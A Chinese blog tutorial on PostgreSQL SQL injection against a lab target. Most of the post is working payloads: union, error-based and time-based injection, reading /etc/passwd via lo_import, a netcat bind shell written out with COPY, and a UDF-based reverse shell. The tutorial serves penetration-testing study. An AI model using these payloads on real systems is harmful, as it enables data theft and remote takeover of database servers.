+<h3 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h3><h4 id="场景一：union-select型注入"><a href="#场景一：union-select型注入" class="headerlink" title="场景一：union-select型注入"></a>场景一：union-select型注入</h4><p>union-select型注入的特点是数据库通过执行union select语句返回的结果集中有一行或多行会被web应用程序处理并返回结果。</p>
+<p>当输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1 and 1=1</span><br><span class="line">1 and 1=2</span><br></pre></td></tr></table></figure>
+<p>时，1=2报错，存在sql注入，确定字段数及回显位置</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1 and 1=1 order by 4--</span><br><span class="line">1 and 1=1 union select 1,2,3,4--</span><br></pre></td></tr></table></figure>
+<p>在这里报错了，因为postgres在进行union select操作时对数据类型敏感</p>
+<p><img src="https://ws3.sinaimg.cn/large/006tKfTcgy1fpimdm03hfj30v003kt98.jpg" alt=""></p>
+<p>改为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and 1=1 union select &apos;1&apos;,&apos;2&apos;,&apos;3&apos;,&apos;4&apos;--</span><br></pre></td></tr></table></figure>
+<p>即可看到回显位置</p>
+<p>获取schema总数和第一个schema名称，更改offset的值可以查询其他schema名称</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1 and 1=1 union select 1,&apos;2&apos;,count(*)::text,&apos;4&apos;from(select table_schema from information_schema.tables where table_schema not in (&apos;pg_catalog&apos;,&apos;information_schema&apos;)group by 1)x--</span><br><span class="line"></span><br><span class="line">1 and 1=1 union select 1,&apos;2&apos;,table_schema,&apos;4&apos; from information_schema.tables where table_schema not in (&apos;pg_catalog&apos;,&apos;information_schema&apos;)group by 3 limit 1 offset 0--</span><br></pre></td></tr></table></figure>
+<h4 id="场景二：union-image型注入"><a href="#场景二：union-image型注入" class="headerlink" title="场景二：union-image型注入"></a>场景二：union-image型注入</h4><p>union-image型注入是一种特殊的union-select注入，因为数据库中存储的字段不是一般的数值或字符串，而是bytea型数据，类似于mssql中的image类型。</p>
+<ul>
+<li>由于服务器脚本在处理返回字段时会将此字段表达的字节直接输入到response流中，，只有这样用户才能从浏览器中看到完整的图片，所以判断关键字进行注入的工具不能使用，只能手工</li>
+<li>服务器可能会返回image/jpeg头，在浏览器中进行测试可能注入成功，也可能返回一个错误图片。</li>
+</ul>
+<p>实验只能在bp中进行， 因为不会在浏览器中显示</p>
+<p>值得注意的是，这次在bp里进行的union select 1,’2’,’3’—并不能回显</p>
+<p>但是当输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1%20and%201=2%20union%20select%201,&apos;2&apos;,&apos;%df&apos;--</span><br></pre></td></tr></table></figure>
+<p>回显报错：</p>
+<p><img src="https://ws2.sinaimg.cn/large/006tKfTcgy1fpj9rwvsolj30x802a3yi.jpg" alt=""></p>
+<p>因为bytea可以看作是字节数组，由于postgres允许将varchar/text类型转换为bytea，同时也能自动转换unknown类型。执行这两种转换时，会将字符串代表的内容转换为对应的utf-8值</p>
+<p>所以根据上面的用法，可以利用以下语句来查询schema名称</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 union select 1,&apos;&apos;,table_schema::text::bytea from information_schema.tables where table_schema not in(&apos;pg_catalog&apos;,&apos;information_schema&apos;) group by 3--</span><br></pre></td></tr></table></figure>
+<p><img src="https://ws2.sinaimg.cn/large/006tKfTcgy1fpjaah99taj31h00cw40k.jpg" alt=""></p>
+<h4 id="场景三：union-list型注入"><a href="#场景三：union-list型注入" class="headerlink" title="场景三：union-list型注入"></a>场景三：union-list型注入</h4><p>union-list型注入点所在脚本文件会遍历查询所有的结果集的每一行，并将其处理后输出在页面</p>
+<p>当构造语句：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?type=article&apos; union select 1,&apos;2&apos;,&apos;3&apos;,&apos;4&apos;--</span><br></pre></td></tr></table></figure>
+<p>web输出页面多了一项3，且位置在第一个，其链接也指向1，所以1和3为回显位置</p>
+<p>此时构造语句：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type=article&apos; and 1=2 union select 1,&apos;&apos;,table_schema,&apos;&apos; from information_schema.tables where table_schema not in(&apos;pg_catalog&apos;,&apos;information_schema&apos;)group by 3--</span><br></pre></td></tr></table></figure>
+<p>即可读取所有schema</p>
+<h4 id="场景四：union-download型注入"><a href="#场景四：union-download型注入" class="headerlink" title="场景四：union-download型注入"></a>场景四：union-download型注入</h4><p>一般网站都有个上传文件的文件夹，为了防止上传攻击，一般都在网站根目录的上级目录，同时在数据库中保存文件的路径。用户下载这个文件夹时服务器脚本根据传递的id获取文件路径，读取文件并直接输出到response流。</p>
+<p>构造语句：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and 1=2 union select 1,&apos;2&apos;,&apos;3&apos;--</span><br></pre></td></tr></table></figure>
+<p>回显为</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tNc79gy1fpjb2gfzvuj30c6018a9y.jpg" alt=""></p>
+<p>可以看到直接将2与文件路径拼接了。那么将2改为某个文件呢，构造</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and 1=2 union select 1,&apos;/download.php&apos;,&apos;3&apos;--</span><br></pre></td></tr></table></figure>
+<p>成功下载download.php文件</p>
+<h4 id="场景五：基于报错的注入"><a href="#场景五：基于报错的注入" class="headerlink" title="场景五：基于报错的注入"></a>场景五：基于报错的注入</h4><p>在update.php中，在rename输入框中输入单引号报错，并且输出了sql语句</p>
+<p><img src="https://ws2.sinaimg.cn/large/006tNc79gy1fpjbadbj7ej30i501qaa4.jpg" alt=""></p>
+<p>可以看到，是update语句，这个语句没有回显，所以只能利用基于报错的思想来进行注入</p>
+<p>构造语句：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;where id=1;select (&apos;!&apos;||count(*)::text)::int from(select table_schema from information_schema.tables where table_schema not in(&apos;pg_catalog&apos;,&apos;information_schema&apos;)group by 1)xx--</span><br></pre></td></tr></table></figure>
+<p>报错信息：</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tNc79gy1fpjbfj0v17j30d701eq2u.jpg" alt=""></p>
+<p>说明schema有两个（感叹号的作用是防止由于count(*)转换为text值之后仍旧代表有效数字 的字符串时转换成功而不返回错误信息，不一定要感叹号，非数字前缀都可以）</p>
+<p>构造语句:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;where id=1;select (&apos;!&apos;||table_schema::text)::int from(select table_schema from information_schema.tables where table_schema not in(&apos;pg_catalog&apos;,&apos;information_schema&apos;)group by 1)x limit 1 offset 0--</span><br></pre></td></tr></table></figure>
+<p>报错信息成功爆出第一个schema</p>
+<p><img src="https://ws3.sinaimg.cn/large/006tNc79gy1fpjbllom6zj30f001ht8m.jpg" alt=""></p>
+<p>每次查询都相当于一次事物操作，出错就会回滚，例如在大对象导入时</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select (&apos;!&apos;||(lo_import(&apos;/etc/passwd&apos;)::text))::int;</span><br></pre></td></tr></table></figure>
+<p>会报错，并且导入失败，此时可以利用临时表进行两次注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">create table tmp(oid int);</span><br><span class="line">insert into tmp values(lo_import(&apos;/etc/passwd&apos;));--</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select (&apos;!&apos;||(id::text))::int from tmp;</span><br></pre></td></tr></table></figure>
+<p><img src="https://ws3.sinaimg.cn/large/006tNc79gy1fpjg3ej9zxj30rc050q3q.jpg" alt=""></p>
+<h4 id="场景六：基于时间的盲注"><a href="#场景六：基于时间的盲注" class="headerlink" title="场景六：基于时间的盲注"></a>场景六：基于时间的盲注</h4><p>postgres中的延时语句是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pg_sleep();</span><br></pre></td></tr></table></figure>
+<p>例如以下语句会创建一个test表，同时如果创建成功，则会延时两秒</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;create table test;select pg_sleep(2) where (select table_name from information_schema.tables where table_schema=current_schema() and table_name=&apos;test&apos;) is not null--</span><br></pre></td></tr></table></figure>
+<p>第一个分号后面的语句可以换成任何合法的sql语句，不过需要对后面的语句作出相应调整</p>
+<p>同时，如果需要多行执行的语句本身就是一个select语句的话，则去掉创建表的语句，并将</p>
+<p>select语句替换为相应语句</p>
+<h3 id="进阶利用"><a href="#进阶利用" class="headerlink" title="进阶利用"></a>进阶利用</h3><h4 id="nc反弹get-shell"><a href="#nc反弹get-shell" class="headerlink" title="nc反弹get shell"></a>nc反弹get shell</h4><p>在靶机上登录postgresql，然后新建表写入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">create table test(t text);</span><br><span class="line">insert into test(t) values (&apos;nc -lvvp 2345 -e /bin/bash&apos;);</span><br><span class="line">select * from test;</span><br><span class="line">copy test(t) to &apos;/root/test&apos;;</span><br></pre></td></tr></table></figure>
+<p><img src="https://ws4.sinaimg.cn/large/006tNc79gy1fpi7erv4u8j30gn05g77d.jpg" alt=""></p>
+<p><img src="https://ws3.sinaimg.cn/large/006tNc79gy1fpi7fmtkw2j30bd01wdgj.jpg" alt=""></p>
+<p>直接运行会提示没有权限，需要给予权限，然后运行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x <span class="built_in">test</span></span><br><span class="line">./<span class="built_in">test</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://ws2.sinaimg.cn/large/006tNc79gy1fpi7hlmjs0j308m01fdg4.jpg" alt=""></p>
+<p>此时在攻击机上进行监听，即可拿到可爱的shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -vn 10.211.55.7 2345</span><br><span class="line">python -c <span class="string">"import pty;pty.spawn('/bin/bash')"</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://ws3.sinaimg.cn/large/006tNc79gy1fpi7jj21c7j30mq0aejst.jpg" alt=""></p>
+<h4 id="利用UDF函数反弹shell"><a href="#利用UDF函数反弹shell" class="headerlink" title="利用UDF函数反弹shell"></a>利用UDF函数反弹shell</h4><ul>
+<li>首先查看是否为super权限</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select usesuper::text::int from pg_user where usename=current_user;</span><br></pre></td></tr></table></figure>
+<p><img src="https://ws3.sinaimg.cn/large/006tNc79gy1fpjqc6uwqfj30ui02w0t0.jpg" alt=""></p>
+<ul>
+<li>确定为super权限后，执行以下语句来返回一个oid</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,lo_creat(-1);</span><br></pre></td></tr></table></figure>
+<p><img src="https://ws2.sinaimg.cn/large/006tNc79gy1fpjqdjwf5vj30hs04674i.jpg" alt=""></p>
+<ul>
+<li>如果不是super权限，就创建临时表保存返回的oid</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">create table tmp(id oid);</span><br><span class="line">insert into temp values(lo_creat(-1));</span><br></pre></td></tr></table></figure>
+<ul>
+<li>接着通过强制类型转换或者盲注获取结果（如果是super权限可以省略这一步）</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select (&apos;&apos;|(id::text))::int from tmp--		//强制类型转换报错</span><br><span class="line">select pg_sleep(5) where (select id from tmp)&gt;0--	//基于时间的盲注</span><br></pre></td></tr></table></figure>
+<ul>
+<li>查看数据库版本，以便选择正确的UDF</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select version();</span><br></pre></td></tr></table></figure>
+<p><img src="https://ws4.sinaimg.cn/large/006tNc79gy1fpjqn0mttjj30uc06mt9d.jpg" alt=""></p>
+<ul>
+<li>根据oid打开之前的大对象，并向其中写入内容(hexcode为udf经过16进制编码后得到的，)</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select lo_open(16474,x&apos;60000&apos;::int);</span><br><span class="line">select lo_write(0,decode(&apos;hexcode&apos;,&apos;hex&apos;));</span><br></pre></td></tr></table></figure>
+<p>建议每次从udf函数中截取512自己并转换为hex值，继续想大对象中追加数据，知道udf完全导入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select lo_open(oid,x&apos;60000&apos;::int);</span><br><span class="line">select lo_lseek(0,0,2);</span><br><span class="line">select lo_write(0,decode(&apos;xxxx,&apos;hex&apos;));</span><br></pre></td></tr></table></figure>
+<ul>
+<li>将文件导出</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select lo_export(oid,&apos;1.dll&apos;);</span><br></pre></td></tr></table></figure>
+<ul>
+<li>删除大对象</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select lo_unlink(oid);</span><br></pre></td></tr></table></figure>
+<ul>
+<li>注册udf函数</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create or replace function test(text,int) returns int as &apos;1.dll&apos;;&apos;GetResvShell&apos; language c;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>获取反弹shell</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select test(&apos;127.0.0.1&apos;,1234);</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">----------------------这是我的底线-----------------------</div>
+    
+</div>
+
+      </div>
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/postgresql/" rel="tag"><i class="fa fa-tag"></i> postgresql</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/03/13/SQL注入被我遗忘的一些tips/" rel="next" title="SQL注入被我忽略的一点tips">
+                <i class="fa fa-chevron-left"></i> SQL注入被我忽略的一点tips
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/03/27/磨皮皮之域环境搭建基础/" rel="prev" title="磨皮皮之域环境搭建基础">
+                磨皮皮之域环境搭建基础 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">spira1</p>
+              <p class="site-description motion-element" itemprop="description">路还很长，我的目标是星辰大海</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">76</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">48</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:eagerseven@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#基础操作"><span class="nav-number">1.</span> <span class="nav-text">基础操作</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#通过目录对象获取关键信息"><span class="nav-number">2.</span> <span class="nav-text">通过目录对象获取关键信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#绕过技巧"><span class="nav-number">3.</span> <span class="nav-text">绕过技巧</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#利用多行执行忽略数据类型敏感限制"><span class="nav-number">3.1.</span> <span class="nav-text">利用多行执行忽略数据类型敏感限制</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#利用美元符号绕过GPC和pg-escape-string"><span class="nav-number">3.2.</span> <span class="nav-text">利用美元符号绕过GPC和pg_escape_string</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#利用特性绕过WAF"><span class="nav-number">3.3.</span> <span class="nav-text">利用特性绕过WAF</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#利用join绕过逗号过滤"><span class="nav-number">3.4.</span> <span class="nav-text">利用join绕过逗号过滤</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#文件操作"><span class="nav-number">4.</span> <span class="nav-text">文件操作</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#copy"><span class="nav-number">4.1.</span> <span class="nav-text">copy</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用场景"><span class="nav-number">5.</span> <span class="nav-text">利用场景</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#场景一：union-select型注入"><span class="nav-number">5.1.</span> <span class="nav-text">场景一：union-select型注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#场景二：union-image型注入"><span class="nav-number">5.2.</span> <span class="nav-text">场景二：union-image型注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#场景三：union-list型注入"><span class="nav-number">5.3.</span> <span class="nav-text">场景三：union-list型注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#场景四：union-download型注入"><span class="nav-number">5.4.</span> <span class="nav-text">场景四：union-download型注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#场景五：基于报错的注入"><span class="nav-number">5.5.</span> <span class="nav-text">场景五：基于报错的注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#场景六：基于时间的盲注"><span class="nav-number">5.6.</span> <span class="nav-text">场景六：基于时间的盲注</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#进阶利用"><span class="nav-number">6.</span> <span class="nav-text">进阶利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#nc反弹get-shell"><span class="nav-number">6.1.</span> <span class="nav-text">nc反弹get shell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#利用UDF函数反弹shell"><span class="nav-number">6.2.</span> <span class="nav-text">利用UDF函数反弹shell</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">spira1</span>
+
+  
+</div>
+<!--
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+-->
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
